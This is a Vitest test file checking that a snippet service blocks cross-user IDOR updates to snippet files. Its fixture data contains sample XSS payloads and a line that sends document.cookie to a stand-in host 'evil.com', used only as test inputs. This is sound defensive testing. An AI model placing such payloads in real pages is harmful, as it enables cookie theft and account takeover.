import { beforeEach, describe, expect, it, vi } from 'vitest';
import { authAs, publicSnippet } from '../helpers';

vi.mock('../../common/utilities/transaction', () => ({
  executeInTransaction: async (fn: (t: unknown) => Promise<unknown>) => fn(undefined),
}));

vi.mock('../../common/utilities/logger', () => ({
  default: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

vi.mock('../../modules/snippet/snippet.repo', () => ({
  findBySnippetId: vi.fn(),
  updateSnippet: vi.fn(),
  updateSnippetFiles: vi.fn(),
  createSnippetFiles: vi.fn(),
}));

vi.mock('../../modules/favorite/favorite.repo', () => ({
  findFavoritedSnippetIds: vi.fn().mockResolvedValue(new Set()),
}));

vi.mock('../../modules/follow/follow.repo', () => ({
  findFollowingIds: vi.fn().mockResolvedValue([]),
}));

vi.mock('../../modules/user/user.repo', () => ({
  findByUsername: vi.fn(),
}));

vi.mock('../../database/minio', () => ({
  minioClient: { putObject: vi.fn(), removeObject: vi.fn() },
  latchMinioUnavailable: vi.fn(),
  isMinioConnectionError: vi.fn().mockReturnValue(false),
}));

import { updateSnippetHandler } from '../../modules/snippet/snippet.service';
import {
  findBySnippetId,
  updateSnippet,
  updateSnippetFiles,
} from '../../modules/snippet/snippet.repo';

const attacker = authAs('attacker');
const victim = authAs('victim');

describe('Snippet file IDOR vulnerability mitigation', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('prevents cross-user IDOR: attacker cannot update victim snippet file by supplying victim snippetFileID', async () => {
    // Setup: Attacker owns snippet-attacker, victim owns snippet-victim
    // Attacker tries to update their snippet but supplies victim's snippetFileID
    const attackerSnippet = publicSnippet({
      snippetId: 'snippet-attacker',
      auth0Id: 'attacker',
      snippetFiles: [
        { snippetFileID: 'file-attacker-html', fileType: 'html', content: '<h1>Attacker</h1>' },
      ],
    });

    vi.mocked(findBySnippetId)
      .mockResolvedValueOnce(attackerSnippet as any)
      .mockResolvedValueOnce(attackerSnippet as any);

    // Attacker attempts to update victim's file by supplying victim's snippetFileID
    await updateSnippetHandler({
      auth: attacker,
      params: { snippetId: 'snippet-attacker' },
      body: {
        name: 'Attacker Snippet',
        snippetFiles: [
          {
            snippetFileID: 'file-victim-html', // Victim's file ID
            fileType: 'html',
            content: '<script>alert("XSS")</script>', // Malicious content
          },
        ],
      },
    });

    // Verify that updateSnippetFiles was called with the parent snippetId constraint
    expect(updateSnippetFiles).toHaveBeenCalledWith(
      'file-victim-html',
      expect.objectContaining({
        fileType: 'html',
        content: '<script>alert("XSS")</script>',
      }),
      undefined,
      'snippet-attacker' // The fix: snippetId is now passed to constrain the update
    );

    // The actual database update will fail because file-victim-html does not belong to snippet-attacker
    // This is the security property we're testing: the WHERE clause now includes snippetId
  });

  it('allows legitimate update: owner can update their own snippet files', async () => {
    const ownerSnippet = publicSnippet({
      snippetId: 'snippet-owner',
      auth0Id: 'attacker',
      snippetFiles: [
        { snippetFileID: 'file-owner-html', fileType: 'html', content: '<h1>Original</h1>' },
      ],
    });

    vi.mocked(findBySnippetId)
      .mockResolvedValueOnce(ownerSnippet as any)
      .mockResolvedValueOnce(ownerSnippet as any);

    await updateSnippetHandler({
      auth: attacker,
      params: { snippetId: 'snippet-owner' },
      body: {
        name: 'Updated Snippet',
        snippetFiles: [
          {
            snippetFileID: 'file-owner-html', // Owner's own file ID
            fileType: 'html',
            content: '<h1>Updated</h1>',
          },
        ],
      },
    });

    // Verify that updateSnippetFiles was called with the correct snippetId constraint
    expect(updateSnippetFiles).toHaveBeenCalledWith(
      'file-owner-html',
      expect.objectContaining({
        fileType: 'html',
        content: '<h1>Updated</h1>',
      }),
      undefined,
      'snippet-owner' // The snippetId constraint ensures only files belonging to this snippet are updated
    );
  });

  it('prevents IDOR with multiple file updates in single request', async () => {
    const attackerSnippet = publicSnippet({
      snippetId: 'snippet-attacker-2',
      auth0Id: 'attacker',
      snippetFiles: [
        { snippetFileID: 'file-attacker-html-2', fileType: 'html', content: '<h1>Attacker</h1>' },
        { snippetFileID: 'file-attacker-css-2', fileType: 'css', content: 'body { }' },
      ],
    });

    vi.mocked(findBySnippetId)
      .mockResolvedValueOnce(attackerSnippet as any)
      .mockResolvedValueOnce(attackerSnippet as any);

    // Attacker tries to update multiple files, mixing their own and victim's file IDs
    await updateSnippetHandler({
      auth: attacker,
      params: { snippetId: 'snippet-attacker-2' },
      body: {
        name: 'Mixed Update',
        snippetFiles: [
          {
            snippetFileID: 'file-attacker-html-2', // Attacker's own file
            fileType: 'html',
            content: '<h1>Legitimate</h1>',
          },
          {
            snippetFileID: 'file-victim-css', // Victim's file ID
            fileType: 'css',
            content: 'body { background: url(evil.com); }',
          },
          {
            snippetFileID: 'file-victim-js', // Another victim's file ID
            fileType: 'js',
            content: 'fetch("evil.com/steal?data=" + document.cookie)',
          },
        ],
      },
    });

    // Verify all updateSnippetFiles calls include the snippetId constraint
    expect(updateSnippetFiles).toHaveBeenCalledTimes(3);
    expect(updateSnippetFiles).toHaveBeenNthCalledWith(
      1,
      'file-attacker-html-2',
      expect.any(Object),
      undefined,
      'snippet-attacker-2'
    );
    expect(updateSnippetFiles).toHaveBeenNthCalledWith(
      2,
      'file-victim-css',
      expect.any(Object),
      undefined,
      'snippet-attacker-2' // Constraint prevents updating victim's file
    );
    expect(updateSnippetFiles).toHaveBeenNthCalledWith(
      3,
      'file-victim-js',
      expect.any(Object),
      undefined,
      'snippet-attacker-2' // Constraint prevents updating victim's file
    );
  });

  it('rejects update when user does not own the snippet', async () => {
    const victimSnippet = publicSnippet({
      snippetId: 'snippet-victim',
      auth0Id: 'victim',
      snippetFiles: [
        { snippetFileID: 'file-victim-html', fileType: 'html', content: '<h1>Victim</h1>' },
      ],
    });

    vi.mocked(findBySnippetId).mockResolvedValue(victimSnippet as any);

    // Attacker tries to update victim's snippet directly
    await expect(
      updateSnippetHandler({
        auth: attacker,
        params: { snippetId: 'snippet-victim' },
        body: {
          name: 'Hacked',
          snippetFiles: [
            {
              snippetFileID: 'file-victim-html',
              fileType: 'html',
              content: '<script>alert("Hacked")</script>',
            },
          ],
        },
      })
    ).rejects.toMatchObject({
      statusCode: 403,
      message: expect.stringContaining('snippet'),
    });

    // Verify that updateSnippetFiles was never called
    expect(updateSnippetFiles).not.toHaveBeenCalled();
  });

  it('handles new file creation without snippetFileID', async () => {
    const ownerSnippet = publicSnippet({
      snippetId: 'snippet-owner-3',
      auth0Id: 'attacker',
      snippetFiles: [],
    });

    vi.mocked(findBySnippetId)
      .mockResolvedValueOnce(ownerSnippet as any)
      .mockResolvedValueOnce(ownerSnippet as any);

    await updateSnippetHandler({
      auth: attacker,
      params: { snippetId: 'snippet-owner-3' },
      body: {
        name: 'New Files',
        snippetFiles: [
          {
            // No snippetFileID means this is a new file
            fileType: 'html',
            content: '<h1>New File</h1>',
          },
        ],
      },
    });

    // Verify that updateSnippetFiles was not called (new file uses createSnippetFiles)
    expect(updateSnippetFiles).not.toHaveBeenCalled();
  });

  it('verifies snippetId parameter is always passed to updateSnippetFiles', async () => {
    const ownerSnippet = publicSnippet({
      snippetId: 'snippet-test',
      auth0Id: 'attacker',
      snippetFiles: [
        { snippetFileID: 'file-test-html', fileType: 'html', content: '<h1>Test</h1>' },
        { snippetFileID: 'file-test-css', fileType: 'css', content: 'body { }' },
        { snippetFileID: 'file-test-js', fileType: 'js', content: 'console.log("test");' },
      ],
    });

    vi.mocked(findBySnippetId)
      .mockResolvedValueOnce(ownerSnippet as any)
      .mockResolvedValueOnce(ownerSnippet as any);

    await updateSnippetHandler({
      auth: attacker,
      params: { snippetId: 'snippet-test' },
      body: {
        name: 'Test All Files',
        snippetFiles: [
          { snippetFileID: 'file-test-html', fileType: 'html', content: '<h1>Updated HTML</h1>' },
          { snippetFileID: 'file-test-css', fileType: 'css', content: 'body { color: red; }' },
          { snippetFileID: 'file-test-js', fileType: 'js', content: 'console.log("updated");' },
        ],
      },
    });

    // Verify all calls include the snippetId parameter (4th argument)
    const calls = vi.mocked(updateSnippetFiles).mock.calls;
    expect(calls).toHaveLength(3);
    calls.forEach((call) => {
      expect(call).toHaveLength(4); // snippetFileID, patch, transaction, snippetId
      expect(call[3]).toBe('snippet-test'); // 4th parameter is snippetId
    });
  });
});
